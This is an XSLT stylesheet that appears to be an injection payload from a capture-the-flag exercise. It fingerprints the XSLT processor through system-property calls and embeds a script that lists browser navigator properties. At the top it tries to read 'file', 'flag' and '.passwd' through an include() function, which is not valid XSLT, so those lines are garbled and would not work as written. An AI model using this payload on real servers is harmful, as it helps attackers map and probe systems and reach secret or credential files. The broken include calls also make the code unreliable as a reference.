<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  
 
  
  <xsl:template match="/">
    <xsl:value-of select="include(file)"/>
    <xsl:value-of select="include(flag)"/>
    <xsl:value-of select="include(.passwd)"/>
    <html>
      <body>
        Version: <xsl:value-of select="system-property('xsl:version')" /><br />
        Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
        Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
        <xsl:if test="system-property('xsl:product-name')">
        Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:product-version')">
        Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:is-schema-aware')">
        Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:supports-serialization')">
        Supports Serialization: <xsl:value-of select="system-property('xsl:supports-
        serialization')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
        Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supports-
        backwards-compatibility')" /><br />
        </xsl:if>
        <br />Navigator Object (JavaScript stuff):
        <pre><font size="2"><script>for (i in navigator) { document.write('<br />navigator.' + i +
        ' = ' + navigator[i]);} </script><div id="output"/><script> if
        (navigator.userAgent.search("Firefox")!=-1) { output=''; for (i in navigator) {
        if(navigator[i]) {output+='navigator.'+i+' = '+navigator[i]+'\n';}} var txtNode =
        document.createTextNode(output); document.getElementById("output").appendChild(txtNode)
        }</script></font></pre>
      </body>
    </html>
    
  </xsl:template>
</xsl:stylesheet>
